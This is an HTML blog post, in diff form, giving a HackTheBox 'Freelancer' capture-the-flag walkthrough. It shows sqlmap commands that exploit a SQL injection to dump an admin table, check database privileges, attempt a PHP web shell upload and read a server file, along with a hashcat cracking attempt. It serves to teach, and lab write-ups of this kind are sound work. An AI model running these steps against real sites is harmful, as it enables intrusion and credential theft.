@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en" prefix="og: https://ogp.me/ns#">
+<head>
+<meta charset="UTF-8" />
+<meta http-equiv="X-UA-Compatible"
+      content="IE=edge">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0" />
+<meta name="description"
+      content="Adventures of Functional Mediocrity" />
+<meta name="keywords"
+      content="zola, theme, ink, hugo-ink, john tuyen, jtuyen" /> 
+
+<title>John Tuyen | Freelancer</title>
+<meta
+  property="og:title"
+  content="John Tuyen | Freelancer"
+/>
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://johntuyen.com/posts/htb-freelancer/" />
+<meta property="og:description" content="Adventures of Functional Mediocrity" />
+<meta property="og:image" content="" />
+<meta property="og:image:url" content="" />
+<meta property="og:image:secure_url" content="" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="Freelancer" />
+<meta name="twitter:description" content="Adventures of Functional Mediocrity" />
+<meta property="twitter:image" content="" />
+
+<link rel="alternate"
+          type="application/rss+xml"
+          title="John Tuyen"
+          href="https://johntuyen.com/atom.xml">
+    <link rel="preconnect"
+          href="https://fonts.googleapis.com">
+    <link rel="preconnect"
+          href="https://fonts.gstatic.com"
+          crossorigin>
+    <!-- <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">  -->
+    <link href="https://fonts.googleapis.com/css2?family=Andada+Pro&display=swap&family=Playfair+Display"
+          rel="stylesheet">
+    <link rel="stylesheet"
+          href="https://johntuyen.com/base.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/feather-icons/4.28.0/feather.min.js"
+            integrity="sha512-7x3zila4t2qNycrtZ31HO0NnJr8kg2VI67YLoRSyi9hGhRN66FHYWr7Axa9Y1J9tGYHVBPqIjSE1ogHrJTz51g=="
+            crossorigin="anonymous"></script>
+</head>
+
+<body>
+    <header>
+        <a class="site-name"
+           href="/">
+            <h1>John Tuyen</h1>
+        </a>
+        <div class="site-description">
+            <p>Adventures of Functional Mediocrity</p>
+        </div>
+        <nav>
+            <div class="links"> 
+            <a 
+                href="https://johntuyen.com/ ">About</a> 
+            <a 
+                href="https://johntuyen.com/posts/ ">Posts</a> 
+            <a 
+                href="https://johntuyen.com/gaze/ ">Gaze</a> 
+            <a 
+                href="https://johntuyen.com/wiretap/ ">Wiretap</a> 
+            <a 
+                href="https://johntuyen.com/tags/ ">Tags</a> 
+            <a 
+                href="https://johntuyen.com/search/ ">Search</a> 
+            </div>
+        </nav>
+    </header>
+    <article>
+    
+
+<section class="post">
+  <div class="post-header">
+    <div class="meta">
+      <div class="date">
+        <span class="day">12</span>
+        <span class="rest">Jun 20</span>
+      </div>
+    </div>
+
+    <div class="matter">
+      <h1 class="title">Freelancer </h1>
+    </div>
+  </div>
+    
+  <article><ol>
+<li>
+<p>The challenge: &quot;Can you test how secure my website is? Prove me wrong and capture the flag!&quot; The URL leads to a web page made by a freelancer.</p>
+</li>
+<li>
+<p>First thing I usually do is inspect the website by clicking around and see what it does, inspect the text, links, and source code for hints. I stumbled upon a contact form that might be of interest. I tried sending some dud info and see what I can find in <code>burpsuite</code>.</p>
+<p><img src="https://johntuyen.com/posts/htb-freelancer/htb-freelancer-1.png" alt="htb-freelancer-1.png" /></p>
+<p><img src="https://johntuyen.com/posts/htb-freelancer/htb-freelancer-2.png" alt="htb-freelancer-2.png" /></p>
+<p>Upon inspection of the source code, I noticed there was a comment in the code about the contact form. I tested further in <code>burpsuite</code> to see what I can find but nothing interesting was found.</p>
+<p>I dug around the source code again and see what else I could find and I stumbled upon this piece of code.</p>
+<p><img src="https://johntuyen.com/posts/htb-freelancer/htb-freelancer-3.png" alt="htb-freelancer-3.png" /></p>
+<p><img src="https://johntuyen.com/posts/htb-freelancer/htb-freelancer-4.png" alt="htb-freelancer-4.png" /></p>
+<p>Looks like a possible SQL injection. I tested all the parameters to double check to see if it's really stored in a database. Parameter ID=4 will show up blank which means the parameter is fetching data stored from a database.</p>
+<p><img src="https://johntuyen.com/posts/htb-freelancer/htb-freelancer-5.png" alt="htb-freelancer-5.png" /></p>
+</li>
+<li>
+<p>Time to test for SQL injection using <code>sqlmap</code></p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>sqlmap -u http://docker.hackthebox.eu:31529/portfolio.php?id=1
+</span></code></pre>
+<p><img src="https://johntuyen.com/posts/htb-freelancer/htb-freelancer-6.png" alt="htb-freelancer-6.png" /></p>
+<p>Tada. SQL injection vulnerability is found. Time to enumerate the database. Let's see what tables are stored in the database.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>sqlmap -u http://docker.hackthebox.eu:31529/portfolio.php?id=1 --tables
+</span></code></pre>
+<p><img src="https://johntuyen.com/posts/htb-freelancer/htb-freelancer-7.png" alt="htb-freelancer-7.png" /></p>
+<p>There is a table named <code>safeadmin</code>, let's take a look what is inside.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>sqlmap -u http://docker.hackthebox.eu:31529/portfolio.php?id=1 -T safeadmin --dump
+</span></code></pre>
+<p><img src="https://johntuyen.com/posts/htb-freelancer/htb-freelancer-8.png" alt="htb-freelancer-8.png" /></p>
+<p><img src="https://johntuyen.com/posts/htb-freelancer/htb-freelancer-9.png" alt="htb-freelancer-9.png" /></p>
+<p>Looks like a <code>bcrypt</code> hash, this doesn't look too good in terms of brute forcing for a password since it will take a lot of time and resources due to the nature of <code>bcrypt</code> encryption. I'll try it anyway for the sake of example.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>sudo hashcat -a 0 -m 3200 bcrypt.txt /usr/share/wordlists/rockyou.txt --force
+</span></code></pre>
+<p><img src="https://johntuyen.com/posts/htb-freelancer/htb-freelancer-10.png" alt="htb-freelancer-10.png" /></p>
+</li>
+<li>
+<p>Seeing that this is <code>bcrypt</code> hash is unbreakable. Time to go back to enumerate the website since I haven't done it yet. If it made you wonder why I didn't do this at the beginning, I usually roam through the website and source code for hidden links or comments that may give clues.</p>
+<p><img src="https://johntuyen.com/posts/htb-freelancer/htb-freelancer-11.png" alt="htb-freelancer-11.png" /></p>
+<p><code>/administrat</code> directory has been found. Upon navigating to the URL, it appears to be a login page. I tried using SQL injection administrator bypass techniques but wasn't successful. </p>
+<p><img src="https://johntuyen.com/posts/htb-freelancer/htb-freelancer-12.png" alt="htb-freelancer-12.png" /></p>
+<p>Let's see what files I can find inside <code>/administrat</code>.</p>
+<p><img src="https://johntuyen.com/posts/htb-freelancer/htb-freelancer-13.png" alt="htb-freelancer-13.png" /></p>
+<p><code>/administrat/panel.php</code> was found. Upon navigating to the URL, it redirects my connection to <code>/administrat/index.php</code>. Strange.</p>
+</li>
+<li>
+<p>After taking a look around once again and figuring out my next steps, I decided to take a look at what database privileges I have using SQL injection. </p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>sqlmap -u http://docker.hackthebox.eu:31689/portfolio.php?id=1 --privileges
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>[21:07:06] [INFO] the back-end DBMS is MySQL
+</span><span>back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)
+</span><span>[21:07:06] [INFO] fetching database users privileges
+</span><span>database management system users privileges:
+</span><span>[*] &#39;db_user&#39;@&#39;%&#39; (administrator) [28]:
+</span><span>   privilege: ALTER
+</span><span>   privilege: ALTER ROUTINE
+</span><span>   privilege: CREATE
+</span><span>   privilege: CREATE ROUTINE
+</span><span>   privilege: CREATE TABLESPACE
+</span><span>   privilege: CREATE TEMPORARY TABLES
+</span><span>   privilege: CREATE USER
+</span><span>   privilege: CREATE VIEW
+</span><span>   privilege: DELETE
+</span><span>   privilege: DROP
+</span><span>   privilege: EVENT
+</span><span>   privilege: EXECUTE
+</span><span>   privilege: FILE
+</span><span>   privilege: INDEX
+</span><span>   privilege: INSERT
+</span><span>   privilege: LOCK TABLES
+</span><span>   privilege: PROCESS
+</span><span>   privilege: REFERENCES
+</span><span>   privilege: RELOAD
+</span><span>   privilege: REPLICATION CLIENT
+</span><span>   privilege: REPLICATION SLAVE
+</span><span>   privilege: SELECT
+</span><span>   privilege: SHOW DATABASES
+</span><span>   privilege: SHOW VIEW
+</span><span>   privilege: SHUTDOWN
+</span><span>   privilege: SUPER
+</span><span>   privilege: TRIGGER
+</span><span>   privilege: UPDATE
+</span><span>[*] &#39;root&#39;@&#39;localhost&#39; (administrator) [28]:
+</span><span>   privilege: ALTER
+</span><span>   privilege: ALTER ROUTINE
+</span><span>   privilege: CREATE
+</span><span>   privilege: CREATE ROUTINE
+</span><span>   privilege: CREATE TABLESPACE
+</span><span>   privilege: CREATE TEMPORARY TABLES
+</span><span>   privilege: CREATE USER
+</span><span>   privilege: CREATE VIEW
+</span><span>   privilege: DELETE
+</span><span>   privilege: DROP
+</span><span>   privilege: EVENT
+</span><span>   privilege: EXECUTE
+</span><span>   privilege: FILE
+</span><span>   privilege: INDEX
+</span><span>   privilege: INSERT
+</span><span>   privilege: LOCK TABLES
+</span><span>   privilege: PROCESS
+</span><span>   privilege: REFERENCES
+</span><span>   privilege: RELOAD
+</span><span>   privilege: REPLICATION CLIENT
+</span><span>   privilege: REPLICATION SLAVE
+</span><span>   privilege: SELECT
+</span><span>   privilege: SHOW DATABASES
+</span><span>   privilege: SHOW VIEW
+</span><span>   privilege: SHUTDOWN
+</span><span>   privilege: SUPER
+</span><span>   privilege: TRIGGER
+</span><span>   privilege: UPDATE
+</span></code></pre>
+<p>What is my current user?</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>sqlmap -u http://docker.hackthebox.eu:31689/portfolio.php?id=1 --current-user
+</span></code></pre>
+<p><img src="https://johntuyen.com/posts/htb-freelancer/htb-freelancer-14.png" alt="htb-freelancer-14.png" /></p>
+<p>Okay, so I know now that I have privileges to <code>FILE</code> which means I can read and maybe write files as <code>db_user</code>.</p>
+</li>
+<li>
+<p>The next idea I had was uploading a php web shell using <code>sqlmap</code> and see if I can execute basic OS commands.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>[22:02:04] [INFO] the back-end DBMS is MySQL
+</span><span>back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)
+</span><span>[22:02:04] [INFO] fingerprinting the back-end DBMS operating system
+</span><span>[22:02:04] [INFO] the back-end DBMS operating system is Linux
+</span><span>[22:02:04] [WARNING] expect junk characters inside the file as a leftover from UNION query
+</span><span>do you want confirmation that the local file &#39;Simple-PHP-Web-Shell/shell.php&#39; has been successfully written on the back-end DBMS file system (&#39;/var/www/html&#39;)? [Y/n] 
+</span><span>[22:02:05] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
+</span></code></pre>
+<p>Looks like my write permissions is not working or I don't have enough privileges. </p>
+</li>
+<li>
+<p>Not sure what I needed to do here, I decided to see what kind of files I can read on the system itself. Since <code>panel.php</code> was acting a bit strange with the redirection, I wonder if there was hidden code inside the php file.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>sqlmap -u http://docker.hackthebox.eu:31689/portfolio.php?id=1 --file-read /var/www/html/administrat/panel.php
+</span></code></pre>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>---
+</span><span>[22:05:55] [INFO] the back-end DBMS is MySQL
+</span><span>back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)
+</span><span>[22:05:55] [INFO] fingerprinting the back-end DBMS operating system
+</span><span>[22:05:55] [INFO] the back-end DBMS operating system is Linux
+</span><span>[22:05:55] [INFO] fetching file: &#39;/var/www/html/administrat/panel.php&#39;
+</span><span>do you want confirmation that the remote file &#39;/var/www/html/administrat/panel.php&#39; has been successfully downloaded from the back-end DBMS file system? [Y/n] 
+</span><span>[22:05:57] [INFO] the local file &#39;/home/jtuyen/.sqlmap/output/docker.hackthebox.eu/files/_var_www_html_administrat_panel.php&#39; and the remote file &#39;/var/www/html/administrat/panel.php&#39; have the same size (880 B)                                                                                                                      
+</span><span>files saved to [1]:
+</span><span>[*] /home/jtuyen/.sqlmap/output/docker.hackthebox.eu/files/_var_www_html_administrat_panel.php (same file)
+</span></code></pre>
+<p>I didn't expect this to happen but the <code>panel.php</code> code contains the flag.</p>
+<p><img src="https://johntuyen.com/posts/htb-freelancer/htb-freelancer-15.png" alt="htb-freelancer-15.png" /></p>
+</li>
+</ol>
+</article>
+
+  
+    
+  
+  <ul class="tags">
+    
+      <li><a href='https://johntuyen.com/tags/hackthebox'>hackthebox</a></li>
+    
+  </ul>
+  
+  
+    
+</section>
+</article>
+    <footer>
+        <div class="social">
+            <ul> 
+                 
+                <li>
+                    <a href="https://github.com/jtuyen"
+                       title="Github" rel="me"><i data-feather="github"></i></a>
+                </li>
+                 
+                 
+                <li>
+                    <a href="https://twitter.com/jtuyen"
+                       title="Twitter"
+                       rel="me"><i data-feather="twitter"></i></a>
+                </li>
+                
+                
+                
+                <li>
+                    <a href="https://johntuyen.com/johntuyenprotonmailcom-pgp.asc" title="PGP" rel="me">
+                        <i data-feather="lock"></i>
+                    </a>
+                </li>
+                
+                <li>
+                    <a href="https://johntuyen.com/atom.xml"
+                       title="John Tuyen"><i data-feather="rss"></i></a>
+                </li>
+            </ul>
+        </div>
+        <p> © John Tuyen 2024
+
+        
+        
+        </p>
+    </footer>
+    <script>
+        feather.replace();
+    </script> 
+    </body>
+</html>
